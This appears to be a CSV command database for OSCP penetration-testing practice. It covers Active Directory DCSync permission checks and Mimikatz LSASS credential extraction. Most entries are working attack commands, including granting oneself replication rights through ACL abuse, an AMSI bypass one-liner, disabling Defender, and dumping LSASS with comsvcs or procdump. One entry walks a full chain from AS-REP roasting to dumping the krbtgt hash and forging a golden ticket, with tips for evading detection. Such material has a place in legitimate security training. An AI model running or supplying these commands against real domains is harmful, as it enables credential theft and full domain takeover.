"ad-dcsync-check-permissions","Check DCSync Replication Permissions","enumeration","Get-DomainObjectAcl -DistinguishedName 'DC=<DOMAIN>,DC=<TLD>' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}","Verify if the current user or specified account has the required ACL permissions to perform DCSync attacks (Replicating Directory Changes rights on the domain object).","privilege-enumeration","Get-DomainObjectAcl -DistinguishedName 'DC=<corp>,DC=<com>' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}","OSCP METHODOLOGY - DCSYNC PERMISSION VALIDATION:
BEFORE attempting DCSync attacks, VALIDATE permissions to avoid:
1.

**Detection**:
Failed DCSync attempts generate Event ID 4662 (suspicious if repeated)
2.

**Time waste**:
Troubleshooting permission errors during exam wastes precious time
3.

**Account lockout**:
Repeated failures may trigger security alerts or account restrictions

WHEN TO CHECK DCSYNC PERMISSIONS:
1.

**After obtaining Domain Admin**:
   - Verify DA account actually works
   - Confirm no unusual ACL restrictions
   - Validate before proceeding with Golden Ticket workflow

2.

**When enumerating privilege escalation paths**:
   - Identify which accounts can DCSync (besides default DAs)
   - Discover custom delegated permissions (backup operators, etc.)
   - Map attack graph:
User A  DCSync  krbtgt hash  Golden Ticket

3.

**After compromising service account**:
   - Some service accounts have replication rights (backup services, monitoring tools)
   - Verify before attempting DCSync with service account credentials

4.

**During ACL abuse attacks**:
   - If you have WriteDACL on domain object, you can GRANT yourself replication rights
   - Validate after granting rights to confirm success

DEFAULT GROUPS WITH REPLICATION RIGHTS:
BY DEFAULT, these groups have DS-Replication-Get-Changes + DS-Replication-Get-Changes-All:
1.

**Domain Admins** (most common):
   - Default administrative group for domain
   - RID:
512 (S-1-5-21-DOMAIN-DOMAIN-DOMAIN-512)
   - Check membership:
net group ""Domain Admins"" /domain

2.

**Enterprise Admins** (forest-wide):
   - Exists only in forest root domain
   - Has admin rights across ALL domains in forest
   - Check membership:
net group ""Enterprise Admins"" /domain

3.

**Administrators** (built-in):
   - Built-in local administrators group
   - Check membership:
net localgroup Administrators

4.

**Domain Controllers** (computer accounts):
   - All DC machine accounts (DC1$, DC2$, etc.)
   - Used for legitimate DC-to-DC replication

CUSTOM DELEGATED PERMISSIONS (less common but possible):
- **Backup Operators**:
Sometimes granted replication rights for backup software
- **Monitoring accounts**:
SIEM/monitoring tools may need replication access for auditing
- **Specific service accounts**:
Custom delegation for specific business needs

DISCOVER CUSTOM DELEGATIONS:
Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'} | Select SecurityIdentifier,ObjectAceType | Sort-Object -Unique
# Shows ALL SIDs with replication rights
# Convert SIDs to names:
ConvertFrom-SID <SID>

MANUAL ALTERNATIVE (without PowerView):
USING DSACLS.EXE (Windows built-in):
dsacls.exe ""DC=corp,DC=com"" | findstr /i replication

OUTPUT EXAMPLE:
  Allow CORP\Domain Admins     DS-Replication-Get-Changes
  Allow CORP\Domain Admins     DS-Replication-Get-Changes-All
  Allow CORP\Enterprise Admins DS-Replication-Get-Changes
  Allow CORP\Enterprise Admins DS-Replication-Get-Changes-All

INTERPRETATION:
- 'Allow' = Permission granted (not 'Deny')
- Principal (CORP\Domain Admins) = Who has permission
- Permission name = What they can do

LOOK FOR YOUR USER/GROUPS:
dsacls.exe ""DC=corp,DC=com"" | findstr /i ""jeffadmin\|replication""
# Shows if user 'jeffadmin' has replication rights

USING NATIVE POWERSHELL (no PowerView):
(Get-Acl -Path 'AD:\DC=corp,DC=com').Access | ? {$_.ObjectType -like '*1131f6a*'} | Select IdentityReference,ActiveDirectoryRights
# ObjectType GUID 1131f6a* matches replication permissions
# Output shows IdentityReference (user/group) and their rights

ACL ABUSE - GRANTING DCSYNC PERMISSIONS:
IF YOU HAVE WriteDACL PERMISSION on domain object, you can GRANT replication rights to any user:
# Add DCSync permissions to user 'backupuser' (PowerView):
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity 'backupuser' -Rights DCSync

# ALTERNATIVELY (native PowerShell, more complex):
$user = Get-ADUser backupuser
$acl = Get-Acl -Path 'AD:\DC=corp,DC=com'
$sid = New-Object System.Security.Principal.SecurityIdentifier $user.SID
# Add DS-Replication-Get-Changes
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')
# Add DS-Replication-Get-Changes-All
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl -Path 'AD:\DC=corp,DC=com' -AclObject $acl

VALIDATE AFTER GRANTING:
Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'backupuser'))}
# Should show BOTH permissions now

TIME ESTIMATES FOR OSCP EXAM:
- Check current user permissions:
<10 seconds (if PowerView loaded)
- Check specific user permissions:
<10 seconds
- List ALL principals with replication rights:
<15 seconds
- Grant DCSync permissions (ACL abuse):
<30 seconds
- Validate after granting:
<10 seconds
- TOTAL (permission check before DCSync):
**<30 seconds**

Always validate before attempting DCSync - 30 seconds of checking saves 5-10 minutes of troubleshooting failed attempts.

DETECTION AND OPSEC:
ACL ENUMERATION DETECTION:
- Event ID 4662:
""An operation was performed on an object"" (DS Access)
  - Object Type:
domain object (DC=corp,DC=com)
  - Access mask:
Read ACL
- VOLUME MATTERS:
Single ACL query is normal, 100+ queries in 10 seconds is suspicious
- OPSEC:
Query ACLs during enumeration phase (not immediately before DCSync)

GRANTING REPLICATION RIGHTS DETECTION (if doing ACL abuse):
- Event ID 5136:
""A directory service object was modified""
  - Attribute:
ntSecurityDescriptor (ACL modification)
  - Value:
Added DS-Replication-Get-Changes[All]
- Event ID 4662:
ACL modification on domain object
- HIGH VISIBILITY:
ACL changes on domain root object are HIGH-PRIORITY ALERTS in mature environments
- OPSEC:
Use existing DA/EA account instead of granting rights (cleaner, less detectable)

COMMON OSCP EXAM SCENARIO:
1.

COMPROMISE DOMAIN USER:
   impacket-GetNPUsers corp.com/ -dc-ip 192.168.50.70 -request
   # AS-REP roast, obtain user 'pete' hash

2.

CRACK HASH:
   hashcat -m 18200 pete_hash.txt rockyou.txt
   # Plaintext:
Password123

3.

VALIDATE PERMISSIONS:
   crackmapexec smb 192.168.50.70 -u pete -p Password123 --groups
   # Output:
pete is NOT in Domain Admins (no DCSync capability)

4.

LATERAL MOVEMENT (find DA):
   crackmapexec smb 192.168.50.0/24 -u pete -p Password123 --local-auth --sam
   # Dump SAM on multiple machines, find cached DA credentials

5.

OBTAIN DA CREDENTIALS:
   # Found:
administrator:2892d26cdf84d7a70e2eb3b9f05c425e (NTLM hash)

6.

VALIDATE DA CAN DCSYNC:
   crackmapexec smb 192.168.50.70 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e --groups
   # Output:
administrator is in Domain Admins 

7.

DCSYNC KRBTGT:
   impacket-secretsdump -just-dc-user krbtgt -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70
   # Success:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
8.

GOLDEN TICKET:
   # Use krbtgt hash for persistent access

The permission validation (step 6) confirms DA status BEFORE attempting DCSync, avoiding failed attempts and detection.

FINAL OSCP EXAM TIPS:
1.

**Always check permissions first**:
30 seconds of validation saves 10 minutes of troubleshooting
2.

**Verify group membership**:
whoami /groups OR crackmapexec --groups
3.

**Know default groups**:
Domain Admins = DCSync capability (no need to check ACLs)
4.

**Custom permissions are rare**:
In OSCP labs, DA/EA are the typical DCSync accounts
5.

**If check fails**:
Verify PowerView is loaded, check DN format, ensure network connectivity
6.

**Document findings**:
Create notes:
""User X can DCSync:
YES/NO""

PRACTICE EXERCISES:
1.

Load PowerView and run permission check on lab domain
2.

Check permissions for your user, Domain Admins group, and Enterprise Admins
3.

List ALL principals with replication rights (remove user filter)
4.

Practice converting SIDs to usernames (ConvertFrom-SID)
5.

Compare PowerView results with dsacls.exe output (verify consistency)
6.

Time yourself:
From PowerShell launch to permission check complete (<30 seconds target)","medium","","","","{""PowerView not recognized"": ""DIAGNOSIS: PowerView module not loaded in current PowerShell session.\n\nSOLUTIONS:\n1. Import PowerView:\n   Import-Module C:\\Tools\\PowerView.ps1\n   # OR dot-source:\n   . .\\PowerView.ps1\n\n2. Download PowerView (if missing):\n   wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1\n   Import-Module .\\PowerView.ps1\n\n3. Bypass AMSI (if blocked):\n   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n   Import-Module .\\PowerView.ps1\n\n4. Use obfuscated PowerView:\n   - Rename functions (Get-DomainObjectAcl \u2192 Get-ObjectPermission)\n   - Use Invoke-Obfuscation tool\n   - Download pre-obfuscated version\n\n5. Alternative without PowerView:\n   dsacls.exe \""DC=corp,DC=com\"" | findstr Replication\n   # Shows raw ACL data (harder to parse but works)"", ""No results but user should have permissions"": ""DIAGNOSIS: Filter is too restrictive or user has inherited permissions via group membership.\n\nSOLUTIONS:\n\n1. CHECK GROUP MEMBERSHIPS:\n   whoami /groups\n   # Look for: Domain Admins, Enterprise Admins, Administrators\n   # These groups have replication rights by default\n\n2. REMOVE USER FILTER (show ALL principals with replication rights):\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'}\n   # Output shows ALL users/groups with replication rights\n   # Check if your groups are listed\n\n3. CHECK SPECIFIC GROUP:\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'Domain Admins'))}\n   # Replace 'Domain Admins' with your group\n\n4. VERIFY INHERITED PERMISSIONS:\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'} | Select SecurityIdentifier,ObjectAceType,ActiveDirectoryRights\n   # Shows SIDs - manually match against your user SID: whoami /user\n\n5. DIRECT ACL QUERY (verify PowerView results):\n   $acl = Get-Acl -Path 'AD:\\DC=corp,DC=com'\n   $acl.Access | ? {$_.ObjectType -like '*Replication*'}\n   # Native PowerShell alternative (GUIDs not resolved)"", ""Missing 'DS-Replication-Get-Changes-All' (only have 'Get-Changes')"": ""DIAGNOSIS: Partial replication rights. BOTH permissions are required for full DCSync.\n\nREQUIRED PERMISSIONS FOR DCSYNC:\n1. DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n   - Allows replication of non-sensitive data\n2. DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n   - Allows replication of password hashes and sensitive attributes\n3. (Optional) DS-Replication-Get-Changes-In-Filtered-Set (GUID: 89e95b76-444d-4c62-991a-0facbeda640c)\n   - Required for Read-Only Domain Controllers (RODC) replication\n\nWITHOUT 'Get-Changes-All':\n- DCSync will FAIL with 'Access denied' or return incomplete data\n- You can replicate user objects but NOT password hashes\n\nSOLUTIONS:\n1. Verify user is Domain Admin: net group \""Domain Admins\"" /domain\n   - Domain Admins have BOTH permissions by default\n2. Check if permissions were custom-assigned (delegation):\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME)} | Select ObjectAceType\n   - Should show BOTH 'Get-Changes' AND 'Get-Changes-All'\n3. If missing 'Get-Changes-All': You cannot DCSync. ALTERNATIVES:\n   - Escalate to Domain Admin (different attack path)\n   - Get local admin on DC and dump NTDS.dit directly\n   - Use credential dumping on DC (LSASS, registry hives)"", ""Checking if specific compromised account can DCSync"": ""SCENARIO: You've obtained credentials for 'backupuser' account. Check if it can DCSync BEFORE attempting (avoid detection from failed DCSync attempts).\n\nCHECK SPECIFIC USER:\nGet-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'backupuser'))}\n\nEXPECTED OUTPUT:\nObjectDN: DC=corp,DC=com\nObjectAceType: DS-Replication-Get-Changes\nSecurityIdentifier: S-1-5-21-...-1234 (backupuser's SID)\n---\nObjectAceType: DS-Replication-Get-Changes-All\nSecurityIdentifier: S-1-5-21-...-1234\n\nIf BOTH permissions present: backupuser can DCSync\nIf MISSING or ONLY ONE present: backupuser CANNOT DCSync\n\nALTERNATIVE CHECK (from Linux/Kali):\n# Attempt DCSync - if permission error, user cannot DCSync:\nimpacket-secretsdump -just-dc-user krbtgt corp.com/backupuser:password@192.168.50.70\n# Error: 'RemoteOperations failed: DCERPC Runtime Error' = No replication rights\n# Success: Credentials dumped = Has replication rights""}","{""Get-DomainObjectAcl"": ""PowerView function that retrieves Access Control Lists (ACLs) for Active Directory objects. Returns discretionary access control entries (DACEs) showing WHO has WHAT permissions on an object. For DCSync validation, we query the domain root object's ACL to see who has replication rights. Requires PowerView module (Import-Module PowerView.ps1). ALTERNATIVES: Get-Acl (native PowerShell but output less readable), dsacls.exe (Windows built-in, cmd-line tool)."", ""-DistinguishedName 'DC=corp,DC=com'"": ""Specifies the Active Directory object to query ACLs for. Distinguished Name (DN) is the full LDAP path to an object. Format: DC=<domain>,DC=<tld> for domain root. EXAMPLES:\n- Single domain: DC=corp,DC=com\n- Subdomain: DC=subdomain,DC=corp,DC=com\n- With OUs: OU=Servers,DC=corp,DC=com\n\nFor DCSync, we MUST query the domain root object (DC=corp,DC=com) because replication rights are granted at domain level, not OU level. GET DN AUTOMATICALLY: (Get-ADDomain).DistinguishedName OR $((Get-Domain).distinguishedname) (PowerView)."", ""-ResolveGUIDs"": ""Translates ObjectType and ObjectAceType GUIDs into human-readable names. WITHOUT this flag, output shows GUIDs like {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (meaningless). WITH -ResolveGUIDs, shows 'DS-Replication-Get-Changes' (actionable). PERFORMANCE: Slower (requires additional LDAP queries to schema), but essential for analysis. FOR DCSYNC, KEY GUIDS:\n- 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes\n- 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes-All\nBOTH are required for full DCSync capability."", ""? {($_.ObjectAceType -match 'Replication')}"": ""PowerShell filter (Where-Object shorthand: ?) to show ONLY ACEs related to replication. $_.ObjectAceType is the permission type (e.g., 'DS-Replication-Get-Changes'). -match 'Replication' uses regex to find any permission containing 'Replication'. WHY FILTER: Domain root object has 100+ ACEs (Domain Admins, Enterprise Admins, Backup Operators, etc.). Filtering shows only DCSync-relevant permissions (Replication-related). ALTERNATIVE FILTERS:\n- ? {$_.ObjectAceType -eq 'DS-Replication-Get-Changes'} (exact match)\n- ? {$_.ObjectAceType -like '*Replication*'} (wildcard match)"", ""$_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME)"": ""Filters ACEs to show ONLY permissions granted to the current user. $_.SecurityIdentifier is the SID of the principal (user/group) who has the permission. ConvertTo-SID $env:USERNAME converts current username to SID. -match compares SIDs. RESULT: Shows if YOU (current user) have replication rights. TO CHECK SPECIFIC USER: Replace $env:USERNAME with 'jeffadmin'. TO CHECK SPECIFIC GROUP: ConvertTo-SID 'Domain Admins'. TO SEE ALL PRINCIPALS: Remove this filter (shows everyone with replication rights, useful for attack planning).""}","[""ad-dcsync-check-domain-admins""]","","[""ad-dcsync-mimikatz-single-user"", ""ad-dcsync-impacket-secretsdump-user""]"
"ad-dcsync-check-domain-admins","Verify Domain Admin Membership","enumeration","net group ""Domain Admins"" /domain","List all members of the Domain Admins group to verify current user has required privileges for DCSync. Domain Admins have replication rights by default.","active-directory","","ALWAYS verify Domain Admin membership BEFORE attempting DCSync. This saves time and avoids failed attack attempts that may generate alerts. If your user is NOT a Domain Admin, check for explicit replication rights assignment (rare but possible). Alternative high-privilege groups: Enterprise Admins (cross-forest), Administrators (domain-wide), Domain Controllers (computer accounts). Time estimate: <5 seconds.

MANUAL ALTERNATIVES:
PowerShell:
Get-ADGroupMember -Identity ""Domain Admins"" | Select Name, SamAccountName
Get-ADUser <USERNAME> -Properties MemberOf | Select -ExpandProperty MemberOf

Verify YOUR membership:
whoami /groups | findstr ""Domain Admins""
net user <USERNAME> /domain | findstr ""Domain Admins""

Impacket (Linux):
lookupsid.py <DOMAIN>/<USER>:<PASS>@<DC_IP>

TIME ESTIMATE: <5 seconds","high","","","","{""Access is denied"": ""Not authenticated to the domain. Solution: Verify you're on a domain-joined machine (systeminfo | findstr /B /C:\""Domain\""). If domain shows 'WORKGROUP', you're not domain-joined. Use 'runas /netonly' to authenticate with domain credentials: runas /netonly /user:<DOMAIN>\\<USER> cmd.exe"", ""Group name could not be found"": ""Not connected to domain controller. Solution: Verify DC connectivity: nltest /dsgetdc:<DOMAIN>. Check DNS resolution: nslookup <DOMAIN>. Ensure network path to DC: ping <DC_FQDN>."", ""No such global group"": ""Typo in group name or querying local groups instead of domain. Solution: Verify exact group name with quotes: net group \""Domain Admins\"" /domain. Check you're using /domain flag (not /localgroup)."", ""User name or password is incorrect"": ""Session credentials expired or invalid. Solution: Re-authenticate with valid domain credentials. Use 'runas /netonly' for explicit credentials. Verify account is not locked: net user <USERNAME> /domain""}","{""net group"": ""Windows built-in command for querying group information in Active Directory. Operates at the domain level (not local groups). This is the fastest native method to check group membership without requiring additional tools."", ""\""Domain Admins\"""": ""Built-in privileged group (SID S-1-5-21-<domain>-512) that has full administrative access across the entire domain. Members automatically receive the extended rights required for DCSync: Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set. CRITICAL: Quote the group name because it contains a space."", ""/domain"": ""Query the domain controller for authoritative group membership. Without this flag, 'net group' would query local groups instead of domain groups. ALWAYS use this flag when checking domain-level privileges.""}","","[""ad-dcsync-check-user-groups"", ""ad-dcsync-check-replication-rights""]","[""ad-dcsync-check-user-groups"", ""ad-dcsync-mimikatz-user"", ""ad-dcsync-secretsdump-user""]"
"ad-dcsync-check-user-groups","Check Current User's Group Memberships","enumeration","whoami /groups","Display all group memberships for the current user to verify Domain Admin or replication privileges. Native Windows command, no additional tools required.","active-directory","","Fastest method to verify your OWN privileges without querying the domain controller. The security token contains all group memberships assigned at logon time. CRITICAL: Token is created at logon - if permissions changed after you logged in, whoami won't reflect new groups until you re-authenticate. For most current state, use 'net user <USERNAME> /domain' to query DC directly. Time estimate: Instant (<1 second).

MANUAL ALTERNATIVES:
Check specific group:
whoami /groups | findstr /I ""Domain Admins""
whoami /groups | findstr /I ""S-1-5-21-.*-512""

PowerShell:
[Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]) }

Verify privileges (alternative indicator):
whoami /priv | findstr SeBackupPrivilege
whoami /priv | findstr SeRestorePrivilege

Linux (after obtaining TGT):
klist
rpcclient -U <DOMAIN>/<USER>%<PASS> <DC_IP> -c 'getusername'

TIME ESTIMATE: <1 second","high","","","","{""No domain groups visible"": ""Not authenticated to domain. Solution: Verify domain authentication: echo %USERDOMAIN%. If shows local computer name instead of domain, re-authenticate with: runas /netonly /user:<DOMAIN>\\<USER> cmd.exe"", ""Domain Admins present but DCSync fails"": ""Group membership cached locally but not effective. Solution: Logoff and logon to refresh token: shutdown /l. Or force token refresh: gpupdate /force && klist purge. Verify effective rights with: whoami /priv (look for SeBackupPrivilege, SeRestorePrivilege)."", ""Groups marked 'Use for deny only'"": ""Account disabled or group membership revoked. Solution: Verify account status: net user <USERNAME> /domain. Check for 'Account active: No'. Contact domain admin or compromise different account.""}","{""whoami"": ""Built-in Windows utility that displays security information about the current user and their access token. No installation required, works on all Windows versions from XP onwards. Faster than 'net user' because it queries the local security token instead of contacting the DC."", ""/groups"": ""Display all security groups the current user belongs to, including SIDs, types, and attributes. Shows both domain and local groups. CRITICAL: Check for 'Domain Admins' (S-1-5-21-<domain>-512), 'Enterprise Admins' (S-1-5-21-<root-domain>-519), or 'Administrators' (S-1-5-32-544). Any of these groups grant DCSync capabilities.""}","","[""ad-dcsync-check-domain-admins"", ""ad-dcsync-check-replication-rights""]","[""ad-dcsync-mimikatz-user"", ""ad-dcsync-secretsdump-user""]"
"ad-dcsync-check-replication-rights","Verify Replication Rights (Advanced)","enumeration","powershell -c ""(Get-Acl 'AD:\<DOMAIN_DN>').Access | Where-Object {$_.IdentityReference -eq '<DOMAIN>\<USERNAME>' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights, ObjectType""","Check for explicit replication rights assignment on domain object. Required only if user is NOT Domain Admin but may have custom replication permissions assigned.","active-directory","powershell -c ""(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -eq 'CORP\jeffadmin' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights, ObjectType""","This check is RARELY needed in OSCP - most DCSync scenarios involve compromised Domain Admin accounts. Use this only if: (1) You have domain user creds but not DA, (2) Suspicious user has DCSync capability (red team defense evasion), (3) Investigating custom permission delegation. In real penetration tests, attackers occasionally find service accounts or helpdesk accounts with these rights assigned for legitimate backup purposes. Time estimate: 5-10 seconds.

MANUAL ALTERNATIVES:
Without PowerShell (dsacls.exe):
dsacls ""<DOMAIN_DN>"" | findstr /I ""<USERNAME>""
dsacls ""<DOMAIN_DN>"" | findstr /I ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2""

Query specific user:
Get-ADUser <USERNAME> -Properties * | Select Name, MemberOf, msDS-AllowedToDelegateTo

BloodHound (automated):
Find users with DCSync rights: MATCH (n:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name

Impacket (Linux):
python3 dacledit.py -action read -principal <USERNAME> -target ""<DOMAIN_DN>"" '<DOMAIN>/<USER>:<PASS>'

TIME ESTIMATE: 10-15 seconds (including RSAT module import)","medium","","","","{""Cannot find drive 'AD'"": ""Active Directory PowerShell module not installed. Solution: Install RSAT: Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools. Or use alternative: dsacls \""<DOMAIN_DN>\"" | findstr /I \""<USERNAME>\"""", ""Access is denied"": ""Insufficient privileges to read domain ACL. Solution: Must be authenticated domain user (any user can read ACLs). Verify domain connectivity: Test-ComputerSecureChannel -Verbose"", ""No output but user IS Domain Admin"": ""Script filtered too strictly. Solution: Domain Admins inherit rights from Administrators group. Check with: Get-ADUser <USERNAME> -Properties MemberOf. If in Domain Admins, DCSync will work regardless of explicit ACL entries."", ""Only one ObjectType GUID present"": ""Missing required replication right. Solution: DCSync requires BOTH DS-Replication-Get-Changes (basic) AND DS-Replication-Get-Changes-All (secrets). Verify with: dsacls \""<DOMAIN_DN>\"" to see full ACL. If only basic rights, DCSync will fail.""}","{""Get-Acl 'AD:\\<DOMAIN_DN>'"": ""PowerShell cmdlet to retrieve Access Control List for the domain root object. The 'AD:' drive must be mounted (requires RSAT Active Directory module). This shows ALL permissions on the domain object, including replication rights."", ""ObjectType GUIDs"": ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes (basic replication). 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes-All (sensitive data including password hashes). BOTH are required for DCSync. Domain Admins have these by default."", ""IdentityReference filter"": ""Matches the user or group being checked. Format: DOMAIN\\Username. This filters the ACL to show only permissions for the specified identity."", ""ActiveDirectoryRights"": ""The specific permissions granted. For DCSync, you need 'ExtendedRight' with the replication ObjectType GUIDs. Generic permissions like 'GenericAll' also grant replication rights.""}","","[""ad-dcsync-check-domain-admins"", ""ad-dcsync-check-user-groups""]","[""ad-dcsync-mimikatz-user"", ""ad-dcsync-secretsdump-user""]"
"mimikatz-sekurlsa-logonpasswords","Mimikatz Extract Logon Passwords","post-exploit",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory. Primary method for credential harvesting on compromised Windows systems. Requires local administrator privileges.","credential-harvesting","","OSCP METHODOLOGY: Credential harvesting is MANDATORY on every compromised system with admin access. Service sessions are goldmines - Domain Admins often run scheduled tasks on workstations, caching credentials accessible to local admins. PATTERN: Local admin on ANY workstation = potential DA credential harvest.

TIME ESTIMATE: 2-5 minutes (1 min upload, 1 min execute, 1-3 min parse output)

MANUAL ALTERNATIVES:
1. LSASS dump: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\temp\lsass.dmp full
2. Parse offline: pypykatz lsa minidump lsass.dmp (on Kali)
3. Procdump: procdump64.exe -ma lsass.exe lsass.dmp

OUTPUT ANALYSIS:
- Session types: Interactive = RDP/console login, Service = scheduled task/service, RemoteInteractive = RDP
- Domain field: Filter for target domain (ignore NT AUTHORITY\SYSTEM, MicrosoftAccount\, etc.)
- NTLM hash format: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c (LM:NTLM)
- Use NTLM directly for Pass-the-Hash (no cracking needed)

EXAM TIPS:
- Save output to file: mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt
- Use Evil-WinRM download to retrieve: download creds.txt
- Document ALL credentials immediately (usernames, domains, hashes, passwords)
- Test Pass-the-Hash before attempting password cracking (saves hours)","high","","","","{""RtlAdjustPrivilege error c0000061"": ""Not running as local administrator. Solution: Verify with 'whoami /groups' - look for 'BUILTIN\\Administrators'. If using Evil-WinRM/PSExec, ensure you specified correct credentials. Alternative: Use 'runas /user:Administrator cmd' to elevate."", ""Handle on memory error 0x00000005"": ""Access denied to LSASS process. Causes: (1) Not local admin, (2) AV/EDR blocking, (3) Protected Process Light (PPL) enabled. Solution: Check AV status: Get-MpPreference. If Defender active: Set-MpPreference -DisableRealtimeMonitoring $true (requires admin). For PPL: Use PPLKiller or mimidrv.sys driver."", ""n.s. (KO) or empty output"": ""Credential Guard enabled (Windows 10+ / Server 2016+). This prevents LSASS memory access even with admin rights. Solution: Alternative techniques: (1) DCSync if you have DA (ad-dcsync-secretsdump-user), (2) Kerberoasting for service accounts, (3) SAM/registry dumps (reg save HKLM\\SAM sam.save), (4) NTDS.dit extraction if on DC. OSCP TIP: Don't waste time fighting Credential Guard - pivot to network-based attacks."", ""AV detection"": ""Mimikatz is heavily signatured. Solution: (1) Invoke-Mimikatz (PowerShell, in-memory), (2) Obfuscated binary (github.com/Tylous/SourcePoint), (3) Offline dump: procdump64.exe -ma lsass.exe lsass.dmp, then: pypykatz lsa minidump lsass.dmp on Kali. (4) Disable Defender: Set-MpPreference -DisableRealtimeMonitoring $true (admin required).""}","{""privilege::debug"": ""Enables SeDebugPrivilege for the current process. This Windows privilege allows debugging of processes you don't own, specifically required to access LSASS memory. WHY REQUIRED: LSASS runs as SYSTEM - even local admins need SeDebugPrivilege to read its memory. SUCCESS: Outputs 'Privilege '20' OK'. FAILURE: 'ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061' indicates insufficient privileges."", ""sekurlsa::logonpasswords"": ""Dumps credentials from LSASS memory for all authenticated sessions. Extracts: (1) Plaintext passwords (if WDigest enabled or stored), (2) NTLM hashes (LM and NTLM), (3) Kerberos tickets (TGT/TGS), (4) SHA1 hashes. WHY THIS WORKS: Windows caches credentials in memory for Single Sign-On. Credentials persist until reboot or logoff. CRITICAL: Service sessions ('Service from 0') often contain Domain Admin credentials even without interactive logons."", ""exit"": ""Cleanly exits Mimikatz after commands execute. WHY: When chaining commands with quotes, 'exit' prevents interactive prompt. Example: mimikatz.exe \""cmd1\"" \""cmd2\"" \""exit\"" runs all commands then terminates. Alternative: Redirect output to file for offline analysis: ... \""exit\"" > logonpasswords.txt"", ""Output format"": ""Credentials grouped by authentication package: msv (NTLM hashes), kerberos (tickets), wdigest (plaintext if enabled), tspkg (TS/RDP). Each session shows: Authentication Id, Session type (Interactive/Service/RemoteInteractive), User Name, Domain, NTLM hash, Password (if available). CRITICAL FIELDS: Domain (filter for target domain), User Name (look for admin accounts), NTLM hash (use for Pass-the-Hash), Session type (Service = cached service account).""}","[""mimikatz-privilege-debug"", ""evil-winrm-upload-file""]","","[""evil-winrm-download-file"", ""pth-cme-exec"", ""hashcat-crack""]"
"mimikatz-logonpasswords","Mimikatz sekurlsa::logonpasswords (Alias)","post-exploit","mimikatz # sekurlsa::logonpasswords","Alias for mimikatz-sekurlsa-logonpasswords. Extract credentials from LSASS memory.","credential-harvesting","","Requires local admin and SeDebugPrivilege. Run privilege::debug first. See mimikatz-sekurlsa-logonpasswords for full details.","high","","","","","","","",""
